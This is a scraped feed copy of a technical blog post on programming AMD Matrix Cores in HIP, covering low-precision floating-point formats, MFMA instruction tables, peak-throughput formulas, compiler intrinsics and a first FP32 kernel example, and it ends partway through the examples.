    &lt;p&gt;In this article, we introduced Matrix Core instructions available on the AMD CDNA™3 and CDNA™4 architectures. We covered floating-point formats in detail, including modern low-precision element data types such as FP8, FP6, FP4, and the scale data type E8M0. We further explained how the floating-point types are represented as binary sequences and demonstrated, with concrete examples, how to convert their binary representations into real values. Next, we listed Matrix Core instructions supported by the modern CDNA™ architectures and discussed how to calculate the theoretical peak performance of Matrix Cores for specific MFMA instructions. To make the discussion more practical, we reviewed the compiler intrinsic functions that allow users to program Matrix Cores inside HIP kernels. Finally, we examined a subset of MFMA instructions in detail, providing code examples and illustrations to explain data layout and demonstrate how to implement simple mixed-precision MFMA operations in HIP. For additional information on Matrix Cores and low-precision data types, please refer to the following resources:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45476820</guid><pubDate>Sat, 04 Oct 2025 21:22:05 +0000</pubDate></item><item><title>Matrix Core Programming on AMD GPUs</title><link>https://salykova.github.io/matrix-cores-cdna</link><description>&lt;doc fingerprint="179c1252016d1d30"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Matrix Core Programming on AMD CDNA3 and CDNA4 architecture&lt;/head&gt;
    &lt;p&gt;TL;DR In this blog post, we walk through how to use Matrix Cores in HIP kernels, with a focus on low-precision data types such as FP16, FP8, and FP4, as well as the new family of Matrix Core instructions with exponent block scaling introduced in the AMD CDNA™4 architecture. Through code examples and illustrations, we provide the necessary knowledge to start programming Matrix Cores, covering modern low-precision floating-point types, the Matrix Core compiler intrinsics, and the data layouts required by the Matrix Core instructions. The blog post is also available on ROCm Blogs.&lt;/p&gt;
    &lt;head rend="h2"&gt;1. Matrix Cores&lt;/head&gt;
    &lt;p&gt;Matrix multiplication is an essential part of AI and HPC workloads. The AMD CDNA™ architecture features special-purpose hardware, the Matrix Cores, to accelerate matrix fused-multiply-add (MFMA) operations defined as &lt;code&gt;D:=A*B+C&lt;/code&gt;. Please note that MFMA instructions are often used to update a matrix in-place (=accumulation) so that &lt;code&gt;D=C&lt;/code&gt; and &lt;code&gt;C:=A*B+C&lt;/code&gt;. The matrices &lt;code&gt;A&lt;/code&gt; and &lt;code&gt;B&lt;/code&gt; are called input matrices, while the matrix &lt;code&gt;D&lt;/code&gt; is referred to as the output matrix or accumulator.&lt;/p&gt;
    &lt;p&gt;The performance gains from using Matrix Cores are especially significant in mixed-precision mode, where the input matrices use lower-precision data types instead of FP32. The output matrix, however, is stored in FP32 to minimize accuracy loss during accumulation. The tables below show the theoretical peak performance of Matrix Cores with different input data types on both AMD CDNA™3 and AMD CDNA™4 architectures. On the AMD Instinct™ MI325X, using FP16 input matrices delivers nearly an 8x performance increase compared to single-precision, with only minimal accuracy loss. Switching to FP8 further doubles the performance providing a 16x increase when compared to FP32. The AMD CDNA™4 architecture further improves Matrix Core performance, delivering up to 2x higher throughput for FP16 and FP8 compared to the AMD CDNA™3 architecture. In addition, AMD CDNA™4 introduces new low-precision data types such as FP6 and FP4, enabling up to 64x performance gain relative to FP32. Please refer to the AMD CDNA™3 and AMD CDNA™4 white papers for detailed architecture specifications.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;AMD Instinct™ MI325X (CDNA™3)&lt;/cell&gt;
        &lt;cell role="head"&gt;Speedup vs. FP32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP64&lt;/cell&gt;
        &lt;cell&gt;163.4 TF&lt;/cell&gt;
        &lt;cell&gt;1x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP32&lt;/cell&gt;
        &lt;cell&gt;163.4 TF&lt;/cell&gt;
        &lt;cell&gt;1x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP16&lt;/cell&gt;
        &lt;cell&gt;1307.4 TF&lt;/cell&gt;
        &lt;cell&gt;~8x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Matrix FP8&lt;/cell&gt;
        &lt;cell&gt;2614.9 TF&lt;/cell&gt;
        &lt;cell&gt;~16x&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;AMD Instinct™ MI355X (CDNA™4)&lt;/cell&gt;
        &lt;cell role="head"&gt;Speedup vs. FP32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP64&lt;/cell&gt;
        &lt;cell&gt;78.6 TF&lt;/cell&gt;
        &lt;cell&gt;~0.5x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP32&lt;/cell&gt;
        &lt;cell&gt;157.3 TF&lt;/cell&gt;
        &lt;cell&gt;1x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP16&lt;/cell&gt;
        &lt;cell&gt;2.5 PF&lt;/cell&gt;
        &lt;cell&gt;~16x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP8&lt;/cell&gt;
        &lt;cell&gt;5 PF&lt;/cell&gt;
        &lt;cell&gt;~32x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP6&lt;/cell&gt;
        &lt;cell&gt;10 PF&lt;/cell&gt;
        &lt;cell&gt;~64x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Matrix FP4&lt;/cell&gt;
        &lt;cell&gt;10 PF&lt;/cell&gt;
        &lt;cell&gt;~64x&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;2. Low-Precision Floating-Point Types&lt;/head&gt;
    &lt;p&gt;A binary representation of a floating-point number consists of &lt;code&gt;n&lt;/code&gt; bits, where &lt;code&gt;m&lt;/code&gt; of &lt;code&gt;n&lt;/code&gt; bits represent the mantissa, 1 bit determines the sign and &lt;code&gt;n-m-1&lt;/code&gt; bits represent the exponent. The following image illustrates the binary format of a floating-point number and how the exponent and mantissa are calculated based on its binary representation.&lt;/p&gt;
    &lt;p&gt;Figure 1: Binary representation of a floating-point number.&lt;/p&gt;
    &lt;p&gt;Floating-point types are characterized by the number of bits used for the exponent and for the mantissa. Increasing the exponent width extends the range of representable values, while increasing the mantissa width improves precision. Since all floating-point types include the sign bit, a shorthand notation typically specifies only the exponent and mantissa widths. For example, the E4M3 type is an 8-bit floating-point type with 4-bit exponent and 3-bit mantissa. Additionally, a floating-point type is specified by exponent bias - a number that is subtracted from the exponent during conversion from binary format to real value. Given the exponent width, mantissa width, and exponent bias, one can convert the binary representation of a floating-point type (except E8M0) into its real value using the following equation:&lt;/p&gt;
    &lt;p&gt;Figure 2: Conversion to real value from binary representation for floating-point numbers.&lt;/p&gt;
    &lt;p&gt;Please note that the equation takes different forms depending on whether the exponent is zero or not. Often, certain exponent and mantissa values are reserved for special values (e.g. &lt;code&gt;NaN&lt;/code&gt;, &lt;code&gt;Infinity&lt;/code&gt;), which limits the range of representable real numbers. For example, the FP16 type has 5-bit exponent with a nominal range of &lt;code&gt;[0, 1, ... 2^5-1] = [0, 1, ... 31]&lt;/code&gt;. However, the exponent value &lt;code&gt;E = 31&lt;/code&gt; is reserved for &lt;code&gt;NaN&lt;/code&gt; (if the mantissa &lt;code&gt;M != 0&lt;/code&gt;) and &lt;code&gt;infinity&lt;/code&gt; (if the mantissa &lt;code&gt;M = 0&lt;/code&gt;). Therefore, the largest exponent value that can represent a real number is &lt;code&gt;E = 30&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;The following table summarizes low-precision types commonly used in modern AI/ML workloads:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="7"&gt;
        &lt;cell role="head"&gt;Width&lt;/cell&gt;
        &lt;cell role="head"&gt;Shorthand&lt;/cell&gt;
        &lt;cell role="head"&gt;Exp. bias&lt;/cell&gt;
        &lt;cell role="head"&gt;Range&lt;/cell&gt;
        &lt;cell role="head"&gt;Zero&lt;/cell&gt;
        &lt;cell role="head"&gt;NaN&lt;/cell&gt;
        &lt;cell role="head"&gt;Infinity&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;16-Bit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E5M10 (FP16)&lt;/cell&gt;
        &lt;cell&gt;15&lt;/cell&gt;
        &lt;cell&gt;±65504&lt;/cell&gt;
        &lt;cell&gt;S 00000 0000000000&lt;/cell&gt;
        &lt;cell&gt;S 11111 xxxxxxxxxx&lt;/cell&gt;
        &lt;cell&gt;S 11111 0000000000&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E8M7 (BF16)&lt;/cell&gt;
        &lt;cell&gt;127&lt;/cell&gt;
        &lt;cell&gt;±3.3895 * 10^38&lt;/cell&gt;
        &lt;cell&gt;S 00000000 0000000&lt;/cell&gt;
        &lt;cell&gt;S 11111111 xxxxxxx&lt;/cell&gt;
        &lt;cell&gt;S 11111111 0000000&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;8-Bit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E4M3FN (FP8, OCP)&lt;/cell&gt;
        &lt;cell&gt;7&lt;/cell&gt;
        &lt;cell&gt;±448&lt;/cell&gt;
        &lt;cell&gt;S 0000 000&lt;/cell&gt;
        &lt;cell&gt;S 1111 111&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E4M3FNUZ (FP8)&lt;/cell&gt;
        &lt;cell&gt;8&lt;/cell&gt;
        &lt;cell&gt;±240&lt;/cell&gt;
        &lt;cell&gt;0 0000 000&lt;/cell&gt;
        &lt;cell&gt;1 0000 000&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E5M2 (BF8, OCP)&lt;/cell&gt;
        &lt;cell&gt;15&lt;/cell&gt;
        &lt;cell&gt;±57344&lt;/cell&gt;
        &lt;cell&gt;S 00000 00&lt;/cell&gt;
        &lt;cell&gt;S 11111 {01, 10 11}&lt;/cell&gt;
        &lt;cell&gt;S 11111 00&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E5M2FNUZ (BF8)&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
        &lt;cell&gt;±57344&lt;/cell&gt;
        &lt;cell&gt;0 00000 00&lt;/cell&gt;
        &lt;cell&gt;S 00000 00&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E8M0&lt;/cell&gt;
        &lt;cell&gt;127&lt;/cell&gt;
        &lt;cell&gt;2^(±127)&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
        &lt;cell&gt;11111111&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;6-Bit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E2M3&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;±7.5&lt;/cell&gt;
        &lt;cell&gt;S 00 000&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E3M2 (BF6)&lt;/cell&gt;
        &lt;cell&gt;3&lt;/cell&gt;
        &lt;cell&gt;±28&lt;/cell&gt;
        &lt;cell&gt;S 000 00&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;4-Bit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;E2M1 (FP4)&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;±6&lt;/cell&gt;
        &lt;cell&gt;S 00 0&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Please note that the E4M3 type has two variants: E4M3FN and E4M3FNUZ. Both E4M3FN and E4M3FNUZ use 4 bits for the exponent and 3 bits for the mantissa. They use different exponent biases and differ in the special values they can represent. Neither variant supports infinities, which is why their notations include FN (FiNite). However, E4M3FN supports &lt;code&gt;+0&lt;/code&gt;, &lt;code&gt;-0&lt;/code&gt;, &lt;code&gt;+NaN&lt;/code&gt; and &lt;code&gt;-Nan&lt;/code&gt;, while E4M3FNUZ supports only &lt;code&gt;+0&lt;/code&gt; and &lt;code&gt;NaN&lt;/code&gt;, hence &lt;code&gt;UZ&lt;/code&gt; (Unsigned Zero). The image below demonstrates how to convert a binary sequence into a real value, using E4M3FNUZ type as an example:&lt;/p&gt;
    &lt;p&gt;Figure 3: E4M3FNUZ encoding details.&lt;/p&gt;
    &lt;p&gt;FP8 types are divided into E4M3 and E5M2 formats. The E5M2 format is sometimes referred to as BF8, similar to BF16, where exponent width is larger compared to FP16. Similar to E4M3, E5M2 is further subdivided into two variants: E5M2 (OCP) and E5M2FNUZ. The AMD CDNA™3 architecture uses FNUZ variants for both E4M3 and E5M2, whereas the CDNA™4 architecture uses E4M3FN and E5M2 (OCP) variants. E4M3FN and E5M2 are standardized formats defined by the Open Compute Project (OCP). For detailed specifications, see the OCP Microscaling Formats (MX) Specification and the ONNX documentation. For visualization of FP8 values and their binary representations please refer to the FP8 Data table. Additionally, see the chapter “Low-precision floating-point types” in the AMD ROCm™ documentation for details on using low-precision types in HIP.&lt;/p&gt;
    &lt;p&gt;There is a special 8-bit format, E8M0, which is not used as a standard element data type but instead serves as a scale factor for microscaling types and block-scaled MFMA operations (discussed later in this article). Its value is calculated according to the equation below:&lt;/p&gt;
    &lt;p&gt;Figure 4: E8M0 encoding details.&lt;/p&gt;
    &lt;p&gt;The exponent value &lt;code&gt;E = 255&lt;/code&gt; is reserved for &lt;code&gt;NaN&lt;/code&gt; values, limiting the range of representable real numbers to &lt;code&gt;[2^-127 ... 2^127]&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Similar to FP8, FP6 has two formats: E2M3 and E3M2. The latter, E3M2, is often referred to as BF6 due to its larger exponent width compared to E2M3.&lt;/p&gt;
    &lt;head rend="h2"&gt;3. Matrix fused-multiply-add (MFMA) Instructions&lt;/head&gt;
    &lt;p&gt;The AMD CDNA™3 and CDNA™4 architectures support a variety of MFMA operations, which are characterized by the matrix dimensions &lt;code&gt;M&lt;/code&gt;, &lt;code&gt;N&lt;/code&gt;, &lt;code&gt;K&lt;/code&gt; and the data type of input/output matrices. The following table lists all available floating-point MFMA instructions for the AMD CDNA™3 and CDNA™4 architectures. As can be seen from the table, the AMD CDNA™4 architecture extends the set of available MFMA instructions by adding new FP16/BF16 instructions with larger matrix dimensions. Furthermore, it introduces FP6/FP4 data types and provides a completely new set of FP8/FP6/FP4 instructions where the types can be independently used for the matrices &lt;code&gt;A&lt;/code&gt; and &lt;code&gt;B&lt;/code&gt;. Finally, the AMD CDNA™4 architecture enables MFMA with block exponent scaling.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;Type (C,D) ← (A,B)&lt;/cell&gt;
        &lt;cell role="head"&gt;MxNxK (CDNA™3)&lt;/cell&gt;
        &lt;cell role="head"&gt;MxNxK (CDNA™4)&lt;/cell&gt;
        &lt;cell role="head"&gt;Cycles&lt;/cell&gt;
        &lt;cell role="head"&gt;Note&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP64 ← FP64&lt;/cell&gt;
        &lt;cell&gt;16x16x4&lt;/cell&gt;
        &lt;cell&gt;16x16x4&lt;/cell&gt;
        &lt;cell&gt;64&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← FP32&lt;/cell&gt;
        &lt;cell&gt;32x32x2&lt;/cell&gt;
        &lt;cell&gt;32x32x2&lt;/cell&gt;
        &lt;cell&gt;64&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;16x16x4&lt;/cell&gt;
        &lt;cell&gt;16x16x4&lt;/cell&gt;
        &lt;cell&gt;32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← FP16 (BF16)&lt;/cell&gt;
        &lt;cell&gt;32x32x8&lt;/cell&gt;
        &lt;cell&gt;32x32x8&lt;/cell&gt;
        &lt;cell&gt;32&lt;/cell&gt;
        &lt;cell&gt;Both A and B are either FP16 or BF16&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;16x16x16&lt;/cell&gt;
        &lt;cell&gt;16x16x16&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;16x16x32&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;32x32x16&lt;/cell&gt;
        &lt;cell&gt;32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← FP8&lt;/cell&gt;
        &lt;cell&gt;16x16x32&lt;/cell&gt;
        &lt;cell&gt;16x16x32&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
        &lt;cell&gt;FP8 (E4M3) or BF8 (E5M2) can be used independently for A and B&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;32x32x16&lt;/cell&gt;
        &lt;cell&gt;32x32x16&lt;/cell&gt;
        &lt;cell&gt;32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← FP8/FP6/FP4&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;16x16x128&lt;/cell&gt;
        &lt;cell&gt;16 or 32&lt;/cell&gt;
        &lt;cell&gt;FP4, FP6 or FP8 can be used independently for A and B. Larger cycle count if either matrix A or B is FP8&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;32x32x64&lt;/cell&gt;
        &lt;cell&gt;32 or 64&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← MXFP8/MXFP6/MXFP4&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;16x16x128&lt;/cell&gt;
        &lt;cell&gt;16 or 32&lt;/cell&gt;
        &lt;cell&gt;FP4, FP6 or FP8 can be used independently for A and B. Larger cycle count if either matrix A or B is FP8&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;32x32x64&lt;/cell&gt;
        &lt;cell&gt;32 or 64&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Please note that the table lists only floating-point type MFMA instructions with batch size = 1. In addition to them, the AMD CDNA™3 and CDNA™4 architectures support batched MFMA operations, where multiple output matrices are computed in parallel. These instructions are not covered in this article. See the Chapter 7 “Matrix Arithmetic Instructions” in the AMD CDNA™3 and AMD CDNA™4 ISA reference guides for the full list of available MFMA instructions.&lt;/p&gt;
    &lt;p&gt;The table above specifies cycle count for each MFMA operation. Given a known cycle count, one can estimate theoretical peak performance in TFLOP/s of corresponding MFMA operation using the formula below:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;
2*M*N*K * num_matrix_cores * (max_engine_clock / cycle_count) / 10^6,
&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;where&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;num_matrix_cores&lt;/code&gt;is total number of matrix cores in a GPU (specified in white paper)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;max_engine_clock&lt;/code&gt;is max engine clock (peak) in MHz (specified in white paper)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;cycle_count&lt;/code&gt;is cycle count of corresponding MFMA instruction&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;M, N, K&lt;/code&gt;are matrix dimensions&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Using this formula and the MFMA instruction &lt;code&gt;32x32x8 FP16&lt;/code&gt; as an example, we can estimate theoretical peak FP16 Matrix Core performance on the AMD Instinct™ MI325X:&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;2*32*32*8 * 1216 * (2100 / 32) / 10^6 = 1307.4 TFLOP/s&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;4. Compiler Intrinsics&lt;/head&gt;
    &lt;p&gt;To use Matrix Core instructions in HIP kernels, LLVM provides built-in compiler intrinsic functions. The list of all available compiler intrinsics can be found in the LLVM Github repository. The syntax of the MFMA intrinsics has the following format:&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;d_reg = __builtin_amdgcn_mfma_ODType_MxNxKInDType(a_reg, b_reg, c_reg, cbsz, abid, blgp)&lt;/code&gt;,&lt;/p&gt;
    &lt;p&gt;where&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;MxNxK&lt;/code&gt;specifies the shapes of the matrices&lt;code&gt;A&lt;/code&gt;,&lt;code&gt;B&lt;/code&gt;,&lt;code&gt;C&lt;/code&gt;,&lt;code&gt;D&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ODType&lt;/code&gt;is data type of the matrices&lt;code&gt;C&lt;/code&gt;and&lt;code&gt;D&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;InDType&lt;/code&gt;is data type of the input matrices&lt;code&gt;A&lt;/code&gt;and&lt;code&gt;B&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;a_reg&lt;/code&gt;is a scalar/vector containing a portion of the matrix&lt;code&gt;A&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;b_reg&lt;/code&gt;is a scalar/vector containing a portion of the matrix&lt;code&gt;B&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;c_reg&lt;/code&gt;is a vector containing a portion of the matrix&lt;code&gt;C&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;d_reg&lt;/code&gt;is a vector containing a portion of the matrix&lt;code&gt;D&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;cbsz&lt;/code&gt;,&lt;code&gt;abid&lt;/code&gt;,&lt;code&gt;blgp&lt;/code&gt;are broadcast flags. For the following discussion, these flags are irrelevant and are, therefore, set to 0 by default, unless specified otherwise. Please refer to the ISA reference guide for detailed information on the broadcast flags.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For example,&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;__builtin_amdgcn_mfma_f32_16x16x16f16&lt;/code&gt;performs&lt;code&gt;16x16x16&lt;/code&gt;MFMA, where both input matrices&lt;code&gt;A&lt;/code&gt;and&lt;code&gt;B&lt;/code&gt;have type&lt;code&gt;FP16&lt;/code&gt;and the output matrix has type&lt;code&gt;FP32&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;__builtin_amdgcn_mfma_f32_32x32x16_fp8_fp8&lt;/code&gt;performs&lt;code&gt;32x32x16&lt;/code&gt;MFMA, where both input matrices&lt;code&gt;A&lt;/code&gt;and&lt;code&gt;B&lt;/code&gt;have type&lt;code&gt;FP8(E4M3)&lt;/code&gt;and the output matrix is stored in&lt;code&gt;FP32&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;__builtin_amdgcn_mfma_f32_32x32x16_fp8_bf8&lt;/code&gt;performs&lt;code&gt;32x32x16&lt;/code&gt;MFMA, where the matrix&lt;code&gt;A&lt;/code&gt;has type&lt;code&gt;FP8(E4M3)&lt;/code&gt;and the matrix&lt;code&gt;B&lt;/code&gt;has type&lt;code&gt;BF8(E5M2)&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The MFMA instructions are wavefront-level (warp-level) instructions, where all work-items (threads) within a wavefront collectively perform a single MFMA operation and the operands &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;B&lt;/code&gt;, &lt;code&gt;C&lt;/code&gt;, &lt;code&gt;D&lt;/code&gt; are distributed across work-items so that each work-item in the wavefront holds a portion of the operands. In order to use the MFMA instructions, it’s required to understand how the operands are distributed across threads within a wavefront. The ISA reference guide fully specifies the data layout for all available MFMA instructions. For illustrative purposes, the next chapter explains a subset of the MFMA instructions and the corresponding data layouts.&lt;/p&gt;
    &lt;head rend="h2"&gt;5. Examples&lt;/head&gt;
    &lt;quote&gt;&lt;p&gt;Important note: In the following discussion we assume the matrices are stored in row-major order. The wavefront size on the AMD CDNA™ architecture is 64. The shapes of the matrices&lt;/p&gt;&lt;code&gt;A&lt;/code&gt;,&lt;code&gt;B&lt;/code&gt;,&lt;code&gt;C&lt;/code&gt;,&lt;code&gt;D&lt;/code&gt;are&lt;code&gt;MxK&lt;/code&gt;,&lt;code&gt;KxN&lt;/code&gt;,&lt;code&gt;MxN&lt;/code&gt;, and&lt;code&gt;MxN&lt;/code&gt;, respectively. The first dimension denotes the number of rows and the second dimension the number of columns in a matrix. For example, the matrix&lt;code&gt;A&lt;/code&gt;has&lt;code&gt;M&lt;/code&gt;rows and&lt;code&gt;K&lt;/code&gt;columns.&lt;/quote&gt;
    &lt;head rend="h3"&gt;5.1. __builtin_amdgcn_mfma_f32_32x32x2f32&lt;/head&gt;
    &lt;p&gt;In this example we will multiply matrix &lt;code&gt;A&lt;/code&gt; of size &lt;code&gt;32x2&lt;/code&gt; with matrix &lt;code&gt;B&lt;/code&gt; of size &lt;code&gt;2x32&lt;/code&gt; using single wavefront (64 threads) and single MFMA instruction. The output matrix &lt;code&gt;C&lt;/code&gt; has shape &lt;code&gt;32x32&lt;/code&gt;. The input and output matrices are FP32. Since threads within a wavefront collectively perform single MFMA instruction, the operands are distributed across the threads. Each thread stores&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;M * K / wavefront_size = 32 * 2 / 64 = 1&lt;/code&gt;entries of the matrix&lt;code&gt;A&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;K * N / wavefront_size = 2 * 32 / 64 = 1&lt;/code&gt;entries of the matrix&lt;code&gt;B&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;M * N / wavefront_size = 32 * 32 / 64 = 16&lt;/code&gt;entries of the matrix&lt;code&gt;C&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The operands are distributed according to the scheme below. The matrix elements highlighted in light red are those stored by the thread with index &lt;code&gt;0&lt;/code&gt; within the wavefront.&lt;/p&gt;
    &lt;p&gt;Figure 5: Data layout for `__builtin_amdgcn_mfma_f32_32x32x2f32`. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;The code example below demonstrates how this operation can be implemented as a HIP kernel:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;

using fp32x16_t = __attribute__((vector_size(16 * sizeof(float)))) float;

__global__ void
mfma_fp32_32x32x2_fp32(const float* A, const float* B, float* C) {
    float a_reg;
    float b_reg;
    fp32x16_t c_reg {};

    const float* ldg_a_ptr = A + threadIdx.x / 32 + 2 * (threadIdx.x % 32);
    const float* ldg_b_ptr = B + threadIdx.x % 32 + (threadIdx.x / 32) * 32;

    a_reg = *ldg_a_ptr;
    b_reg = *ldg_b_ptr;

    c_reg = __builtin_amdgcn_mfma_f32_32x32x2f32(a_reg, b_reg, c_reg, 0, 0, 0);

    for (int i = 0; i &amp;lt; 4; i++) {
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + i * 32 * 8]          = c_reg[i * 4];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 1 + i * 32 * 8] = c_reg[i * 4 + 1];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 2 + i * 32 * 8] = c_reg[i * 4 + 2];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 3 + i * 32 * 8] = c_reg[i * 4 + 3];
    }
}
&lt;/code&gt;
    &lt;p&gt;The GPU kernel can then be invoked on the host using a single wavefront:&lt;/p&gt;
